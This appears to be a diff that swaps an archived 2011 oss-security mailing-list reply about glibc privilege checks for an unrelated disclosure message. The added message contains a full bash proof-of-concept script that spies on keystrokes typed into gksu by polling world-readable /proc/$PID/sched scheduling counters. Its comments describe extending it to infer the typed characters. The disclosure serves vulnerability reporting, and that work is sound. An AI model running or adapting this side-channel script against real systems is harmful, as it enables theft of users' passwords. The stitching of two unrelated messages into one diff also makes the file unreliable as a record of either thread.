@@ -1,37 +1,71 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/05/16/11
-Message-ID: <20110516222642.GA18032@altlinux.org>
-Date: Tue, 17 May 2011 02:26:42 +0400
-From: "Dmitry V. Levin" <ldv@...linux.org>
-To: oss-security@...ts.openwall.com
-Subject: Re: Multiple libraries privilege checking
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/11/05/3
+Message-ID: <20111105104736.GA3509@albatros>
+Date: Sat, 5 Nov 2011 14:47:36 +0400
+From: Vasiliy Kulikov <segooon@...il.com>
+To: security@...nel.org
+Cc: oss-security@...ts.openwall.com
+Subject: /proc/$PID/sched PoC: spy-gksu
 Content-Type: text/plain; charset=utf-8
 
-On Mon, May 16, 2011 at 10:56:37PM +0400, Solar Designer wrote:
-> On Mon, May 16, 2011 at 04:27:41PM +0200, Sebastian Krahmer wrote:
-> > Its probably about time to review libraries that are commonly
-> > linked to (formerly-) suid programs, such as
-> > libldap, libssl etc. In near future, in the advent of file caps
-> > they are often lacking proper checks.
-> 
-> Good idea.
-> 
-> > They usually just compare uid against euid (not even gid sometimes)
-> > and do not check the dumpable flag or AT_SECURE (dont know whether
-> > glibc exports a proper function to easily check that at all).
-> 
-> glibc exports the __libc_enable_secure variable, which is initialized
-> based on AT_* including AT_SECURE.  It also exports __secure_getenv().
+#!/bin/bash
+#
+# A PoC for spying for keystrokes in gksu in Linux <= 3.1.
+#
+# /proc/$PID/{sched,schedstat} are world readable, so we can just loop
+# on one CPU core while the victim is executed on another, and spy for
+# the changes of scheduling counters.  The PoC counts only keystrokes number,
+# but it can be easily extended to note the delays between the keystrokes
+# and do the statistical analysis to learn the input characters.  See
+# e.g. "Peeping Tom in the Neighborhood: Keystroke Eavesdropping on
+# Multi-User Systems" by Kehuan Zhang and XiaoFeng Wang.
+#
+# It is NOT stable, it only shows a design flaw (the lack of proper
+# permission model of procfs debugging counters).  The constants are true
+# for the author's system only and don't take into account other sources of
+# gksu CPU activity.
+#
+#   by segoon from openwall
+#
+# run as: spy-sched gksu
 
-There is a problem: in upstream glibc, __libc_enable_secure is placed into
-GLIBC_PRIVATE section, thus making it unavailable in most of rpm-based
-distros.  This is surely not the case in Owl and ALT Linux, where
-__libc_enable_secure is legal interface for use in applications,
-and some essential libraries are already patched to use
-__libc_enable_secure instead of uid comparisons.
+PNAME="$1"
 
+while :; do
+    PID=`pgrep "$PNAME"`
+    if [ -n "$PID" ]; then
+        echo $PID
+        cd /proc/$PID/
+        break
+    fi
+    sleep 1
+done
+
+S=0.0
+while :; do
+    V=`grep se.exec_start sched 2>/dev/null | cut -d: -f2-`
+    [ -z "$V" ] && break
+    if [ "$V" != "$S" ]; then
+        VAL=`echo "$V - $S" | bc -l`
+        VALI=`echo $VAL | cut -d. -f1`
+        [ -z "$VALI" ] && VALI=0
+
+        if [ "$VALI" -le 815 -a "$VALI" -ge 785 ]; then
+            # Cursor appeared
+            :
+        elif [ $VALI -le 415 -a $VALI -ge 385 ]; then
+            # Cursor disappeared
+            :
+        elif [ $VALI -ge 150 ]; then
+            echo "$VAL (KEY PRESSED)"
+        else
+            echo "$VAL"
+        fi
+
+        S=$V
+    fi
+done
 
 -- 
-ldv
-
-Content of type "application/pgp-signature" skipped
+Vasiliy Kulikov
+http://www.openwall.com - bringing security into open computing environments
